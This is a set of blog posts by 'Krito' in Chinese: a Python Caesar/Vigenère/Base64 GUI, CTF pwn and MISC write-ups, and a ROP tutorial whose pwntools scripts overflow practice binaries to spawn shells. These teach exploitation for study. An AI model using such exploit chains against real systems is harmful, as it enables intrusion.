[{"id":"e1d661934d9f5478d5fd55c9f411bd18","title":"加/解密小程序","content":"\n\n\n\n\n\n\n\n\n学了密码学以后，突发奇想想做个用来加解密的小程序玩玩\n加/解密算法凯撒密码凯撒密码属于古典密码的替换式密码，就是将明文替换成位移后对应的字符，如密钥key=3，则a-&gt;d，b-&gt;e，c-&gt;f……（凯撒密码的密钥为数字0-25）\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# 凯撒加密def Caesar_Encryption():    output.delete(0, &#x27;end&#x27;)    plaintext = entry_frame.get()  # 获取输入内容    key = key_frame.get()    ciphertext = &#x27;&#x27;    if key.isdigit():        key = int(key)%26        for i in plaintext:            if i.isalpha():  # 判断是否是字符                if i.isupper(): # 判断是否是大写                    ciphertext += chr((ord(i.lower()) - 97 + key) % 26 +                                      97).upper()                else:                    ciphertext += chr((ord(i) - 97 + key) % 26 + 97)            else:  #如果不是字符就照常输出                ciphertext += i        output.insert(0, ciphertext)    else:  # 如果密钥输入错误提示报错        Error()# 凯撒解密def Caesar_Decrypt():    output.delete(0, &#x27;end&#x27;)    ciphertext = entry_frame.get()    key = key_frame.get()    plaintext = &#x27;&#x27;    if key.isdigit():        key = int(key)%26        for i in ciphertext:            if i.isalpha():  # 判断是否是字符                if i.isupper():  # 判断是否是大写                    if ord(i.lower()) - key &lt; 97:                        plaintext += chr(                            26 + ord(i.lower()) -                            key).upper()  #123-(97-(ord(i.lower()) - key))                    else:                        plaintext += chr(ord(i.lower()) - key).upper()                else:                    if ord(i) - key &lt; 97:                        plaintext += chr(26 + ord(i) - key)                    else:                        plaintext += chr(ord(i) - key)            else:  #如果不是字符就照常输出                plaintext += i        output.insert(0, plaintext)  # 输出到文本框    else:   # 如果密钥输入错误提示报错        Error()\n\n维吉尼亚密码使用一系列凯撒密码组成密码字母表的加密算法，其密钥为字母\n\n如明文：here is it work，密钥：victor，则对应的密文：cmtx wj db yhfb\n123456789101112131415161718192021222324252627282930313233father_list = []  #存储维吉尼亚表#生成维吉尼亚表for i in range(26):    temp_list = [chr(j) for j in range(97 + i, 123)]    for i in range(97, 97 + i):        temp_list.append(chr(i))    father_list.append(temp_list)# 维吉尼亚加密def Virginia_Encryption():    output.delete(0, &#x27;end&#x27;)    plaintext = entry_frame.get()  # 获取输入内容    key = key_frame.get()  # 获取输入密钥    if key.isalpha():  # 判断密钥是否全为字母        ciphertext = &#x27;&#x27;        n = 0  # 记录读取字符的位置        m = 0  # 记录读取密钥的位置        for i in plaintext:            if plaintext[n].isalpha():  # 判断是否是字符                if plaintext[n].isupper():  # 判断是否为大写字母                    ciphertext += father_list[ord(key[m % len(key)]) -                                              97][ord(i.lower()) - 97].upper()                else:  # 小写字母就以小写输出                    ciphertext += father_list[ord(key[m % len(key)]) -                                              97][ord(i) - 97]                m += 1                n += 1            else:  #如果不是字符就照常输出                ciphertext += i                n += 1        output.insert(0, ciphertext)  # 输出到文本框    else:  # 若密钥错误提示报错        Error()\n\nbase64编码base64是一种基于64个可打印字符来表示二进制数据的表示方法。没有密钥。（这里就偷个懒，直接使用了base64库）\n12345678910111213141516import base64# base64加密def Base64_Encryption():    output.delete(0, &#x27;end&#x27;)    plaintext = entry_frame.get()    output.insert(0, base64.b64encode(plaintext.encode(&#x27;UTF-8&#x27;)))# base64解密def Base64_Decrypt():    output.delete(0, &#x27;end&#x27;)    try:        ciphertext = entry_frame.get()        output.insert(0, base64.b64decode(ciphertext.encode(&#x27;UTF-8&#x27;)))  # 输出到文本框    except:        Error_input()\n\n界面设置利用tkinter库设计主界面窗口\n123456789101112131415161718192021222324252627import tkinter as tkwindow = tk.Tk()  # 创建一个窗口window.title(&#x27;Secert&#x27;)  # 设置窗口标题window.geometry(&#x27;500x500&#x27;)  # 设置窗口大小entry_name = tk.Label(window, text=&quot;Plaintext/Ciphertext:&quot;)  # 对窗口命名entry_name.place(relx=0.12, rely=0.05, anchor=tk.CENTER)  # 放置输入窗口文字# 设置输入框entry_frame = tk.Entry(window) entry_frame.place(relx=0.5, rely=0.05, anchor=tk.CENTER, width=200,                  height=25)  # 放置输入窗口key_name = tk.Label(window, text=&quot;key:&quot;)  # 设置密钥窗口文字# 在界面上进行标注key_name.place(relx=0.12, rely=0.12, anchor=tk.CENTER)Virginia_name = tk.Label(window, text=&quot;Virginia:&quot;)  Virginia_name.place(relx=0.12, rely=0.2, anchor=tk.CENTER)Caesar_name = tk.Label(window, text=&quot;Caesar:&quot;)Caesar_name.place(relx=0.12, rely=0.4, anchor=tk.CENTER)Base64_name = tk.Label(window, text=&quot;Base64:&quot;)Base64_name.place(relx=0.12, rely=0.6, anchor=tk.CENTER)key_frame = tk.Entry(window)key_frame.place(relx=0.5, rely=0.12, anchor=tk.CENTER, width=200,                height=25) # 放置输出框output_name = tk.Label(window, text=&#x27;Output:&#x27;)output_name.place(relx=0.12, rely=0.9, anchor=tk.CENTER)output = tk.Entry(window)output.place(relx=0.5, rely=0.9, anchor=tk.CENTER, width=200, height=30)\n\n123456tkinter.TK()                                       \t\t\t     用来创建一个窗口tkinter.TK().title()                                             用来命名窗口tkinter.TK().geometry()                                          用来设置窗口大小tkinter.Label(TK,text&#x3D;)                                          在Tk窗口申请一个标签，text设置标签名tkinter.Label.place(relx&#x3D;, rely&#x3D;, anchor&#x3D;)          \t\t     relx是设置横向坐标，rely设置纵向坐标 ，anchor通过它来控制插件 与其内容的相对位置。tkinter.Entry(TK)                     \t\t\t\t  \t         在TK窗口申请一个输入框\n\n\n\n放置按钮\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# 维吉尼亚加密按钮bottom_Virginia_Encryption = tk.Button(window,                                       text=&#x27;Virginia_Encryption&#x27;,                                       width=15,                                       height=2,                                       command=Virginia_Encryption)  # 设置加密按钮bottom_Virginia_Encryption.place(relx=0.35, rely=0.2, anchor=tk.CENTER)# 维吉尼亚解密按钮bottom_Virginia_Decrypt = tk.Button(window,                                    text=&#x27;Virginia_Decrypt&#x27;,                                    width=15,                                    height=2,                                    command=Virginia_Decrypt)  # 设置解密按钮bottom_Virginia_Decrypt.place(relx=0.65, rely=0.2, anchor=tk.CENTER)# 凯撒加密按钮bottom_Caesar_Encryption = tk.Button(window,                                     text=&#x27;Caesar_Encryption&#x27;,                                     width=15,                                     height=2,                                     command=Caesar_Encryption)  # 设置加密按钮bottom_Caesar_Encryption.place(relx=0.35, rely=0.4, anchor=tk.CENTER)# 凯撒解密按钮bottom_Caesar_Decrypt = tk.Button(window,                                  text=&#x27;Caesar_Decrypt&#x27;,                                  width=15,                                  height=2,                                  command=Caesar_Decrypt)  # 设置加密按钮bottom_Caesar_Decrypt.place(relx=0.65, rely=0.4, anchor=tk.CENTER)# base64加密按钮bottom_Base64_Encryption = tk.Button(window,                                     text=&#x27;Base64_Encryption&#x27;,                                     width=15,                                     height=2,                                     command=Base64_Encryption)  # 设置加密按钮bottom_Base64_Encryption.place(relx=0.35, rely=0.6, anchor=tk.CENTER)# base64解密按钮bottom_Base64_Decrypt = tk.Button(window,                                  text=&#x27;Base64_Decrypt&#x27;,                                  width=15,                                  height=2,                                  command=Base64_Decrypt)  # 设置加密按钮bottom_Base64_Decrypt.place(relx=0.65, rely=0.6, anchor=tk.CENTER)\n\n1tkinte.Button(TK,text&#x3D;,width&#x3D;,height&#x3D;,command&#x3D;)       在TK窗口申请一个按钮，text设置按钮名字，width设置按钮宽度，height设置按钮高度，command设置按钮的功能\n\n异常输入当密钥或者密文输入错误，为了提醒用户，需要设置一些报错函数\n123456789from tkinter import messagebox# 错误密钥警报def Error():    messagebox.showwarning(title=&#x27;Wrong!&#x27;, message=&#x27;Wrong key!!!&#x27;)# 错误输入警报def Error_input():    messagebox.showwarning(title=&#x27;Wrong!&#x27;, message=&#x27;Wrong input!!!&#x27;)\n\n1messagebox.showwarning(title&#x3D;, message&#x3D;)       当函数被调用，首先程序会被停止，之后弹出一个警告框，title用于设置警告框名称，message用于设置警告框的内容\n\n如下图所示\n\n完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220import tkinter as tkimport base64from tkinter import messageboxfather_list = []  #存储维吉尼亚表#生成维吉尼亚表for i in range(26):    temp_list = [chr(j) for j in range(97 + i, 123)]    for i in range(97, 97 + i):        temp_list.append(chr(i))    father_list.append(temp_list)# 凯撒加密def Caesar_Encryption():    output.delete(0, &#x27;end&#x27;)    plaintext = entry_frame.get()  # 获取输入内容    key = key_frame.get()    ciphertext = &#x27;&#x27;    if key.isdigit():        key = int(key)%26        for i in plaintext:            if i.isalpha():  # 判断是否是字符                if i.isupper():                    ciphertext += chr((ord(i.lower()) - 97 + key) % 26 +                                      97).upper()                else:                    ciphertext += chr((ord(i) - 97 + key) % 26 + 97)            else:  #如果不是字符就照常输出                ciphertext += i        output.insert(0, ciphertext)    else:        Error()# 凯撒解密def Caesar_Decrypt():    output.delete(0, &#x27;end&#x27;)    ciphertext = entry_frame.get()    key = key_frame.get()    plaintext = &#x27;&#x27;    if key.isdigit():        key = int(key)%26        for i in ciphertext:            if i.isalpha():  # 判断是否是字符                if i.isupper():                    if ord(i.lower()) - key &lt; 97:                        plaintext += chr(                            26 + ord(i.lower()) -                            key).upper()  #123-(97-(ord(i.lower()) - key))                    else:                        plaintext += chr(ord(i.lower()) - key).upper()                else:                    if ord(i) - key &lt; 97:                        plaintext += chr(26 + ord(i) - key)                    else:                        plaintext += chr(ord(i) - key)            else:  #如果不是字符就照常输出                plaintext += i        output.insert(0, plaintext)    else:        Error()# 维吉尼亚加密def Virginia_Encryption():    output.delete(0, &#x27;end&#x27;)    plaintext = entry_frame.get()  # 获取输入内容    key = key_frame.get()    if key.isalpha():        ciphertext = &#x27;&#x27;        n = 0  # 记录读取字符的位置        m = 0  # 记录读取密钥的位置        for i in plaintext:            if plaintext[n].isalpha():  # 判断是否是字符                if plaintext[n].isupper():  # 判断是否为大写字母                    ciphertext += father_list[ord(key[m % len(key)]) -                                              97][ord(i.lower()) - 97].upper()                else:  # 小写字母就以小写输出                    ciphertext += father_list[ord(key[m % len(key)]) -                                              97][ord(i) - 97]                m += 1                n += 1            else:  #如果不是字符就照常输出                ciphertext += i                n += 1        output.insert(0, ciphertext)    else:        Error()# 维吉尼亚解密def Virginia_Decrypt():    alpha = [chr(i) for i in range(97, 123)]    plaintext = &#x27;&#x27;    n = 0  # 记录读取字符的位置    m = 0  # 记录读取密钥的位置    output.delete(0, &#x27;end&#x27;)    ciphertext = entry_frame.get()    key = key_frame.get()    if key.isalpha():        for i in ciphertext:            if ciphertext[n].isalpha():                if ciphertext[n].isupper():  # 判断是否为大写字母                    plaintext += alpha[father_list[                        ord(key[m % len(key)]) - 97].index(                            ciphertext[n].lower())].upper()                else:                    plaintext += alpha[father_list[ord(key[m % len(key)]) -                                                   97].index(ciphertext[n])]                m += 1                n += 1            else:  #如果不是字符就照常输出                plaintext += i                n += 1        output.insert(0, plaintext)    else:        Error()# base64加密def Base64_Encryption():    output.delete(0, &#x27;end&#x27;)    plaintext = entry_frame.get()    output.insert(0, base64.b64encode(plaintext.encode(&#x27;UTF-8&#x27;)))# base64解密def Base64_Decrypt():    output.delete(0, &#x27;end&#x27;)    try:        ciphertext = entry_frame.get()        output.insert(0, base64.b64decode(ciphertext.encode(&#x27;UTF-8&#x27;)))    except:        Error_input()# 错误密钥警报def Error():    messagebox.showwarning(title=&#x27;Wrong!&#x27;, message=&#x27;Wrong key!!!&#x27;)# 错误输入警报def Error_input():    messagebox.showwarning(title=&#x27;Wrong!&#x27;, message=&#x27;Wrong input!!!&#x27;)window = tk.Tk()window.title(&#x27;Secert&#x27;)  # 设置窗口标题window.geometry(&#x27;500x500&#x27;)  # 设置窗口大小entry_name = tk.Label(window, text=&quot;Plaintext/Ciphertext:&quot;)entry_name.place(relx=0.12, rely=0.05, anchor=tk.CENTER)  # 放置输入窗口文字entry_frame = tk.Entry(window)  # 设置输入框entry_frame.place(relx=0.5, rely=0.05, anchor=tk.CENTER, width=200,                  height=25)  # 放置输入窗口key_name = tk.Label(window, text=&quot;key:&quot;)  # 设置密钥窗口文字key_name.place(relx=0.12, rely=0.12, anchor=tk.CENTER)Virginia_name = tk.Label(window, text=&quot;Virginia:&quot;)Virginia_name.place(relx=0.12, rely=0.2, anchor=tk.CENTER)Caesar_name = tk.Label(window, text=&quot;Caesar:&quot;)Caesar_name.place(relx=0.12, rely=0.4, anchor=tk.CENTER)Base64_name = tk.Label(window, text=&quot;Base64:&quot;)Base64_name.place(relx=0.12, rely=0.6, anchor=tk.CENTER)key_frame = tk.Entry(window)key_frame.place(relx=0.5, rely=0.12, anchor=tk.CENTER, width=200,                height=25)  # 放置密钥窗口output_name = tk.Label(window, text=&#x27;Output:&#x27;)output_name.place(relx=0.12, rely=0.9, anchor=tk.CENTER)output = tk.Entry(window)output.place(relx=0.5, rely=0.9, anchor=tk.CENTER, width=200, height=30)# 维吉尼亚加密按钮bottom_Virginia_Encryption = tk.Button(window,                                       text=&#x27;Virginia_Encryption&#x27;,                                       width=15,                                       height=2,                                       command=Virginia_Encryption)  # 设置加密按钮bottom_Virginia_Encryption.place(relx=0.35, rely=0.2, anchor=tk.CENTER)# 维吉尼亚解密按钮bottom_Virginia_Decrypt = tk.Button(window,                                    text=&#x27;Virginia_Decrypt&#x27;,                                    width=15,                                    height=2,                                    command=Virginia_Decrypt)  # 设置解密按钮bottom_Virginia_Decrypt.place(relx=0.65, rely=0.2, anchor=tk.CENTER)# 凯撒加密按钮bottom_Caesar_Encryption = tk.Button(window,                                     text=&#x27;Caesar_Encryption&#x27;,                                     width=15,                                     height=2,                                     command=Caesar_Encryption)  # 设置加密按钮bottom_Caesar_Encryption.place(relx=0.35, rely=0.4, anchor=tk.CENTER)# 凯撒解密按钮bottom_Caesar_Decrypt = tk.Button(window,                                  text=&#x27;Caesar_Decrypt&#x27;,                                  width=15,                                  height=2,                                  command=Caesar_Decrypt)  # 设置加密按钮bottom_Caesar_Decrypt.place(relx=0.65, rely=0.4, anchor=tk.CENTER)# base64加密按钮bottom_Base64_Encryption = tk.Button(window,                                     text=&#x27;Base64_Encryption&#x27;,                                     width=15,                                     height=2,                                     command=Base64_Encryption)  # 设置加密按钮bottom_Base64_Encryption.place(relx=0.35, rely=0.6, anchor=tk.CENTER)# base64解密按钮bottom_Base64_Decrypt = tk.Button(window,                                  text=&#x27;Base64_Decrypt&#x27;,                                  width=15,                                  height=2,                                  command=Base64_Decrypt)  # 设置加密按钮bottom_Base64_Decrypt.place(relx=0.65, rely=0.6, anchor=tk.CENTER)window.mainloop()  # 重复循环\n\n效果图\n\n","slug":"加-解密小程序","date":"2021-09-10T15:15:11.000Z","categories_index":"","tags_index":"python","author_index":"Krito"},{"id":"144f81ea5594fe5e9363a228d67919cf","title":"Bugku pwn","content":"overflowcheck一下可以看到是64位程序，什么保护也没开，IDA查看，可以看到存在明显的栈溢出\n再看函数窗口，可以看见存在一个可疑的函数，点进去可以发现是一个后门函数\n\n所以思路就是利用栈溢出跳转到后门函数，这样就可以得到flag\nEXP12345from pwn import *p = process(&quot;./pwn2&quot;)payload = &#x27;a&#x27;*0x30+&#x27;a&#x27;*8+p64(0x400769)p.sendline(payload)p.interactive()\n\noverflow2check一下，64位开了NX保护。IDA查看，存在溢出\n在函数窗口发现system函数，在字符串窗口发现bin/sh。可以利用ROP来获得shell\n找到gadget的地址\n构建payload就可以了\nEXP123456789from pwn import *#p = process(&quot;./pwn5&quot;)p = remote(&quot;114.67.246.176&quot;,15097)sys_addr = 0x401050bin_sh = 0x402004pop_rdi = 0x40126bpayload = &#x27;a&#x27;*0x20+&#x27;a&#x27;*8+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)p.sendline(payload)p.interactive()\n\n\n\nread_note签到题，直接可以获得flag\nCanary看题目就知道是考canary，check一下，发现是一个64位程序，开了canary和NX保护\n查看一下伪代码，很明显，存在栈溢出漏洞，read可以读取0x300字节，但缓冲区只有0x240字节空间\n查看字符串，发现存在bin/sh，在函数表里面也存在system函数\n所以思路大概出来了，利用gadgets来获取shell。接下来就是思考如何解决canary保护，观察伪代码，里面有printf函数，我们可以利用printf函数来泄露canary，printf函数输出时会以x00为输出结尾，只要我们将canary值的x00覆盖掉就可以泄露了。\n所以，第一步，获取gadgets。因为是64位程序，所以传参时前六个参数是利用rdi, rsi, rdx, rcx, r8, r9寄存器来传递，所以需要将bin/sh传递到rdi寄存器。\n接下来就是泄露canary，buf的偏移量是0x240-8(减8是因为canary的值在ebp减8的位置)，之后利用printf函数泄露即可。\n最后再组装一下就可以得出exp了。\nEXP12345678910111213from pwn import *p = process(&#x27;./pwn4_&#x27;)pop_rdi = 0x400963binsh = 0x601068sys = 0x40080Cpayload = &#x27;a&#x27; * (0x240 - 8)p.sendlineafter(&#x27;Please leave your name(Within 36 Length):&#x27;, payload)p.recvline()canary = p.recv(7).rjust(8, &#x27;\\x00&#x27;)print canarypayload1 = &#x27;a&#x27; * (0x210 - 8) + canary + &#x27;a&#x27;*8 + p64(pop_rdi) + p64(binsh) + p64(sys)p.sendafter(&#x27;Please leave a message(Within 0x200 Length):&#x27; , payload1)p.interactive()\n\n","slug":"Bugku-PWN","date":"2021-07-03T14:10:52.000Z","categories_index":"PWN","tags_index":"wp","author_index":"Krito"},{"id":"4a7667facf84943d5e400f474fc547ee","title":"ROP","content":"ROP原理随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。\n之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件\n\n程序存在溢出，并且可以控制返回地址。\n可以找到满足条件的 gadgets 以及相应 gadgets 的地址。\n\n如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。\nret2text方法控制程序执行程序本身已有的的代码 (.text)\n思路首先查看附件，32位可执行文件且只开了NX保护\n\n利用IDA查看伪代码，可以看到，主函数存在栈溢出漏洞\n不仅如此，在secure函数中发现了系统调用，其地址为0x0804863A，所以我们可以利用secure函数的代码来获取系统的shell\n接下来就是计算s的偏移量。设置断点0x08048641，进行调试\n可以看到，esp指向地址为0xffffcf70，ebp指向地址为0xffffcff8，因为s的地址为esp+0x1c，所以s相当于ebp的偏移量为：0xffffcff8-0xffffcf70-0x1c=0x6c，s相当于返回地址的偏移量为： 0x6c+4\nEXP123456from pwn import *sh = process(&#x27;./ret2text&#x27;)target = 0x804863ash.sendline(&#x27;A&#x27; * (0x6c+4) + p32(target))sh.interactive()\n\n\n\nret2shellcode方法程序执行我们自己填充的shellcode代码\n思路按照ret2text思路，发现存在栈溢出，计算出s相对于返回地址的偏移量为112。查看字符串，并没有发现system函数，但是我们发现我们输入的字符串会复制到buf2，所以我们可以利用buf2构造shellcode代码，\n先判断一下buf2所在地址是否可执行。利用IDA查看buf2的地址\n在查看一下这个地址是否可执行。发现这个地址可读可写可执行。\n之后构建payload\nEXP12345678910111213from pwn import *sh = process(&#x27;./ret2shellcode&#x27;)buf2 = 0x804A080shellcode = asm(shellcraft.sh())payload = shellcode.ljust(112, &#x27;A&#x27;) + p32(buf2)sh.sendline(payload)sh.interactive()&quot;&quot;&quot;解释一下&quot;&quot;&quot;&quot;&quot;&quot;shellcraft.sh作用是生成好system(&quot;bin/sh&quot;)的代码&quot;&quot;&quot;&quot;&quot;&quot;asm函数是将代码转成机器指令&quot;&quot;&quot;&quot;&quot;&quot;ljust函数作用就是向右对其并用给定字符补充字符串&quot;&quot;&quot;\n\n\n\nret2syscall方法控制程序执行系统调用，获取 shell。\n思路先查看附件\n\n接下来利用 IDA 来查看源码，并没有system函数，而且也没有bin/sh字符\n可以看到，函数存在栈溢出，接下来就是计算v4的偏移量。先设置断点，将断点设置在调用gets函数那里\n接下来就是调试。可以看到esp指向地址0xffffcf80，v4的地址为esp+1c，ebp指向的地址0xffffd008，由此可以计算出v4的偏移量为0xffffd008-0xffffcf80-0x1c=108，所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。\n此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。（系统调用基本知识）我们可以通过执行 int 0x80 来执行对应的系统调用。对于这道题，我们可以使用这个系统调用**execve(“/bin/sh”,NULL,NULL)**，其中，该程序是 32 位，这个系统调用需要满足的条件：\n\n系统调用号，即 eax 应该为 0xb（是指系统调用编号）\n第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。\n第二个参数，即 ecx 应该为 0\n第三个参数，即 edx 应该为 0\n\n为满足这些条件，我们可以使用 gadgets来完成。如利用堆栈对寄存器赋值，先将10存入栈中，再pop eax。所以，接下来就是寻找符合条件的gadgets。（ROPgadget安装与使用方法）\n接下来就是组装：**payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, int_0x80])**，其中 0xb 为 execve 对应的系统调用号。\nEXP1234567891011from pwn import *sh = process(&#x27;./rop&#x27;)pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421bin_sh = 0x80be408payload =&#x27;A&#x27; * 112+p32(pop_eax_ret)+ p32(0xb)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(bin_sh)+p32(int_0x80)sh.sendline(payload)sh.interactive()\n\nret2libc1方法利用gadgets构建ROP获取shell\n思路check一下32位程序，且只开了NX保护\n\n丢进IDA，查看伪代码，存在gets函数，很明显存在栈溢出\n查看函数列表以及字符串列表，很明显可以构建ROP\n最后就是计算偏移量。s的偏移量0xffffcfb8-ffffcf4c=6c，相对于返回地址的偏移量6c+4\nEXP12345678from pwn import *p = process(&quot;./ret2libc1&quot;)sys_addr = 0x8048460bin_sh = 0x08048720payload = &#x27;a&#x27;*112+p32(sys_addr)+p32(0x11111111)+p32(bin_sh)p.sendline(payload)p.interactive()&quot;&quot;&quot;因为调用system函数中途需要一个返回地址，而直接利用system gadget会导致缺失返回地址，所以需要一个虚拟地址p32(0x11111111)&quot;&quot;&quot;\n\nret2libc2ida查看，可以看到这里有system函数，但是没有bin/sh，但是这里有gets函数，我们可以利用gets函数传入bin/sh字符，从而利用system获取shell\n\n\n计算好偏移，将通过gets获取的字符存入到bss段可写区域\n\nEXP123456789from pwn import *p = process(&quot;./ret2libc2&quot;)sys_addr = 0x08048490bss = 0x804a000gets_addr = 0x8048460pop_ebx = 0x0804843dpayload = &#x27;a&#x27;*0x70+p32(gets_addr)+p32(pop_ebx)+p32(bss)+p32(sys_addr)+&#x27;bbbb&#x27;+p32(bss)p.sendline(payload)p.interactive()\n\n\n\n参考文章：https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/#ret2syscall\n","slug":"ROP","date":"2021-06-05T10:23:30.000Z","categories_index":"PWN","tags_index":"积累","author_index":"Krito"},{"id":"8178986268830468ddd9f4a48060d9de","title":"BUU MISC刷题记录","content":"金三胖下载附件，打开是gif，仔细看发现gif会闪现一些字符，通过利用Stegsolve或者PS逐帧分析合并就可得到flag\n\n二维码在线扫码，得到secret is here\n用winhex打开发现图片里面藏了压缩包，压缩包里面有一个4number.txt文件\n利用binwalk分离得到一个加密的文件，4number应该是提示，提示密码只有四位数，直接爆破得到密码，打开flag\nN种方法解决附件是exe文件，无法直接运行，拖进winhex里面发现是十六进制是base64编码的图片，解码得到二维码，扫码得到flag\n大白题目给了提示，是不是屏幕太小了，再看看附件，发现高度明显有问题，直接修改高度得到flag\n你竟然赶我走签到题，将附件拖进winhex，在最下面发现flag\n基础破解提示密码是四位数，直接爆破，得到密码，打开发现内容被加密，猜测是base64\nbase64解码得到flag\n\n乌镇峰会种图签到题，拖进winhex拉到最底下就可以看到flag\nLSB根据题目名，LSB（Least Significant Bit），意为最低有效位；MSB（Most Significant Bit），意为最高有效位。使用Stegsolve\n保存，发现是一个二维码，扫码得到flag\n文件中的秘密拖进winhex，使用binwalk没有发现什么东西，打开照片属性里面发现备注有flag\nrar根据提示爆破，得到密码打开就是flag\n\nqr签到题，扫码得到flag\nzip伪加密看名字就知道是伪加密，拖进winhex，修改后直接打开就能得到flag\nningen将文件丢进winhex，拖到最后可以看到照片里面藏了压缩包，还有一个txt文件\n直接修改后缀名，发现一个加密txt文件，根据题目提示爆破得到密码，打开文件得到flag\n镜子里面的世界使用winhex没有发现什么东西，看到文件名盲猜使用Stegsolve修改最低有效位，果然，得到flag\n小明的保险箱拖进winhex，在文件最后发现有个2.txt文件，猜测里面藏了压缩包，使用binwalk分离，得到压缩包\n根据提示进行爆破得到flag\n爱因斯坦拖进winhex，发现里面藏有压缩包，直接改后缀名，尝试了一下，发现不是伪加密，返回照片查看，在属性备注里面发现密码，改成zip就可以看到flag了\n","slug":"BUU-MISC刷题记录","date":"2021-05-31T00:48:04.000Z","categories_index":"MISC","tags_index":"write up","author_index":"Krito"},{"id":"a37c8c0bbab0e8b3e41a4408c944d53f","title":"栈溢出","content":"原理栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是\n\n程序必须向栈上写入数据。\n写入的数据大小没有被良好地控制。\n\nrip思路首先查看附件，发现没开什么保护，丢进IDA里面看一下\n\n发现可疑函数（fun），点进去可以发现函数调用了/bin/sh，接下来我们可以利用这个函数得到flag\n开始调试。首先创造一个长度为150的字符串，运行该附件，将那个字符串输入进去\n之后程序直接报错，因为return地址处不是一个正确的地址值，无法跳转。通过return的那个地址值，我们可以计算return距离输入点的长度。使用cyclic计算偏移量\n得到偏移量就可以写exp了\n编写EXP123456from pwn import *p = remote(&#x27;node3.buuoj.cn&#x27;,28652)fun = 0x401186payload = &#x27;a&#x27;*23+p64(fun+1)  //平衡堆栈p.sendline(payload)p.interactive()\n\nwarmup_csaw_2016思路也是一个简单的栈溢出，思路还是一样的，先查看保护，还是什么保护都没有开\n丢进IDA查看，就是输出两个语句和一个函数地址，查看函数，发现是打开flag文件。思路立刻就有了，因为是gets函数没有限制输入，所以可以通过栈溢出来获得flag。所以，接下来要计算偏移量\n还是和上面一题一样的方法计算偏移量\n\nEXP12345from pwn import *p=remote(&#x27;node3.buuoj.cn&#x27;,26972)payload=&#x27;a&#x27;*0x40+&#x27;a&#x27;*8+p64(0x40060D)p.sendline(payload)p.interactive()\n\nciscn_2019_n_1思路老规矩，先检查开了什么保护，发现只开了NX，其它没有开，也就是数据段不可执行\n扔进IDA查看，也就是调用了func函数，点进func函数，函数先是将用户输入的值赋予给v1，之后判断v2是否等于11.28125，如果等于就可以得到flag，所以思路就是计算v1和v2相差多少，再利用gets函数将v2覆盖为11.28125\n\n因为11.28125在内存中是以十六进制存储，所以要将11.28125转成十六进制\nEXP12345from pwn import *p = remote(&#x27;node3.buuoj.cn&#x27;,25675)payload = ‘a&#x27; *(0x30-0x4) + p64(0x41348000)p.sendline(payload)p.interactive()\n\n","slug":"栈溢出","date":"2021-05-23T05:47:11.000Z","categories_index":"PWN","tags_index":"积累","author_index":"Krito"},{"id":"dde0577c288faf648c0d6f90bbb39dc6","title":"CISCN复现","content":"前言初次参加这种大型比赛，给我的感觉就是题目出的挺不错（一题都没做出来），但是这个比赛形式着实令人不解。不仅如此，在写完选择题后系统崩溃也是我没想得到（虽然没有停滞很久，但是感觉很意外，毕竟是国赛）。\nMISC隔空传话附件是一个txt文件，里面全是十六进制码，根据题目搜索发现是PDU编码解码，解码发现前面四行得到有用的信息：flag前面一部分是15030442和w465。而后面则是一堆十六进制码，但是发现在第一行十六进制码的开头几个十六进制码正好是png十六进制文件头，猜测这些应该是png图片的十六进制码，利用脚本将其导出：\n1234567891011121314151617181920212223242526272829303132333435363738394041from selenium import webdriver# 打开读取data.txt文件with open(&#x27;../data.txt&#x27;, &#x27;r&#x27;) as f:    data = f.read()data = data.splitlines()[4:]  # 前四条不是十六进制# 启动谷歌browser = webdriver.Chrome()url = &quot;http://www.sendsms.cn/pdu/&quot;browser.get(url)output = &#x27;&#x27;  # 用于接收结果for i in data:    browser.find_element_by_name(&quot;smsText2&quot;).clear()  # 清空转换框里面的内容    browser.find_element_by_name(&quot;smsText2&quot;).send_keys(i)  # 输入要翻译的内容    browser.find_element_by_xpath(&quot;//input[@name=&#x27;checkButton&#x27;]&quot;).click()  # 点击翻译    recv = browser.find_element_by_name(&quot;smsOut&quot;).get_attribute(&#x27;value&#x27;)  # 获取翻译内容    recv = recv.split()  # 将获得内容按空格分开    n = 0    txt = &#x27;&#x27;    for j in recv:  # 读取需要的信息        if n == 3:  # 获取时间戳            txt += j        if n == 13:            txt += j  # 获取十六进制码            txt += &#x27;\\n&#x27;  # 分行        n += 1    output += txtbrowser.quit()  # 退出浏览器output = output.splitlines()result = &#x27;&#x27;time = []data = []for i in output:  # 按时间戳进行排序    time.append(int(i[3:5]) * 60 + int(i[6:8]) - 1800)    